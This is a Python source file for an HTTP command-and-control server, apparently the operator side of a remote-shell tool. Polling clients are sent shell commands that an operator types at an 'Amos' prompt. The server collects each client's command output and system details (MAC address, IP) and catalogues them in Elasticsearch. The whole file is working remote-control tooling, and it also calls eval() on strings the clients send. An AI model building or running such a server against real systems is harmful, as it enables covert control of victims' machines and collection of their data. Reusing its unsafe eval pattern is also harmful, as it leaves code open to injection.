from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import threading
from EsHandler import EsHandler
import time
import requests



class MyHandler(BaseHTTPRequestHandler):


    connected_clients = {}  # Use a class variable to store connected clients with their unique IDs
    selected_client_ip = None  # Variable to store the selected client IP after using 'select' command
    input_ready = threading.Condition()  # Condition object for synchronizing input
    es_handler = None



    @staticmethod
    def convert_text(text):
            RESET = "\033[0m"
            BOLD = "\033[1m"
            COLOR = "\u001b[36m" 
            return f"{BOLD}{COLOR}{text}{RESET}"



    # Don't print: 127.0.0.1 - - [22/Jun/2021 21:29:43] "POST / HTTP/1.1" 200
    def log_message(self, format, *args):
        pass



    #sends command to server
    def send_shell_command_to_client(self):
        # Use the input_ready condition to wait for user input from the shell interface
        with MyHandler.input_ready:
            MyHandler.input_ready.wait()

            self.wfile.write(MyHandler.shell_command.encode())
            print("Result:", MyHandler.shell_command)
            



    def do_GET(self):
        if MyHandler.selected_client_ip is None:
            # If the selected client IP is None, handle the command locally (not sent to a client)
            client_ip = self.client_address[0]
            client_id = self.get_client_id(client_ip)

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.send_shell_command_to_client()

        else:
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.send_shell_command_to_client()



    def do_POST(self):
        client_ip = self.client_address[0]
        length = int(self.headers['Content-Length'])
        self.send_response(200)
        self.end_headers()

        data = parse_qs(self.rfile.read(length).decode())

        if "rfile" in data:

            if MyHandler.shell_command == "sys_info":
                sys_info = data["rfile"][0]
                sys_info = eval(sys_info.replace("'", "\"")) # Convert the string to a Python dictionary
                sys_info.update({"ip": str(client_ip)}) #update ip fields with client IP
                mac_address = sys_info.get('mac-address')
                
                if MyHandler.es_handler.is_client_present(mac_address):
                    MyHandler.es_handler.update_document(mac_address, sys_info)
                else:
                    MyHandler.es_handler.store_client_information(sys_info)
            else:
                print(data["rfile"][0])





    def get_client_id(self, client_ip):
        # Get the client ID based on the client's IP address
        if client_ip in MyHandler.connected_clients:
            return MyHandler.connected_clients[client_ip]
        else:
            # If the client is not in the connected_clients dictionary, generate a new ID
            new_client_id = len(MyHandler.connected_clients) + 1
            MyHandler.connected_clients[client_ip] = new_client_id
            return new_client_id



    def continuous_communication(self, client_ip):
        # Send the initial "sys_info" command to the client before starting the loop
        with MyHandler.input_ready:
            MyHandler.shell_command = "sys_info"
            MyHandler.input_ready.notify()

        print(f"Communicating with Client IP: {client_ip}")
        amos_text = self.convert_text(f"Amos (Client IP: {client_ip}): ")

        while True:
            command = input(f"{amos_text}").rstrip()
            if command.strip().lower() == 'exit':
                break

            # Store the shell command in the class variable and notify the server thread
            with MyHandler.input_ready:
                MyHandler.shell_command = command
                MyHandler.input_ready.notify()

            # Add a small delay to allow the server thread to process the command
            threading.Event().wait(0.1)



    def send_check_call_command(self, client_ip):

        # Set a timeout of 5 seconds
        timeout = 5  
        # Wait for the response from the client with a timeout
        start_time = time.time()
        response_received = False

        while not response_received and time.time() - start_time < timeout:
           
            # Send the "check call" command to the client
            with MyHandler.input_ready:
                MyHandler.shell_command = "check call"
                MyHandler.input_ready.notify()
                response_received = True

        if response_received:
            # Print the result received from the client
            print(f"Client IP: {client_ip} - Check Call Result: {response_received}")
            response_received = False
        else:
            # Handle the case when the timeout is reached
            print(f"Client IP: {client_ip} - Check Call timed out after {timeout} seconds")




    def is_client_connected(self, client_ip, esHandler):
        try:
            resp = esHandler.es.search(index=esHandler.db_name, query={"match": {"ip": client_ip}})
            esHandler.tabulate_data(resp)

        except Exception as e:
            print(f"An error occurred: {e}")




    def get_client_ip(self, client_id, esHandler):
        try:
            resp = esHandler.es.get(index=esHandler.db_name, id=client_id)
            return resp["_source"]["ip"]

        except Exception as e:
            print(f"An error occurred: {e}")






